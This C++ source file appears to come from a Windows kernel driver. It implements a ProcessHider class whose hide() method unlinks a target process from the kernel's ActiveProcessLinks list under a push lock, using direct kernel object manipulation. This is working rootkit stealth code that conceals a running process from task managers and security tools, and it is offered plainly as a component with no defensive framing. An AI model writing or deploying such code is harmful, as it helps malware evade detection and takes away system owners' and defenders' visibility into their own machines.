#include "Offsets.h"
#include "ProcessHider.h"

ProcessHider::ProcessHider(Process& process)
	: m_process(process)
{}

NTSTATUS ProcessHider::hide() {
    const auto activeProcessLinksAddress = reinterpret_cast<ULONG_PTR>(m_process.get()) + static_cast<ULONG>(Offsets::activeProcessLinks);
    const auto processListEntry = reinterpret_cast<PLIST_ENTRY>(activeProcessLinksAddress);

    const auto processListLockAddress = reinterpret_cast<ULONG_PTR>(m_process.get()) + static_cast<ULONG>(Offsets::processLock);

    // Using the ActiveProcessLinks lock to avoid accessing problems.
    const auto listLock = reinterpret_cast<PEX_PUSH_LOCK>(processListLockAddress);

    ExAcquirePushLockExclusive(listLock);

    PLIST_ENTRY previous;
    PLIST_ENTRY next;

    previous = processListEntry->Blink;
    next = processListEntry->Flink;

    previous->Flink = next;
    next->Blink = previous;

    // Re-write the current LIST_ENTRY to point to itself (avoiding BSOD).
    processListEntry->Blink = reinterpret_cast<PLIST_ENTRY>(&processListEntry->Flink);
    processListEntry->Flink = reinterpret_cast<PLIST_ENTRY>(&processListEntry->Flink);

    ExReleasePushLockExclusive(listLock);

    return STATUS_SUCCESS;
}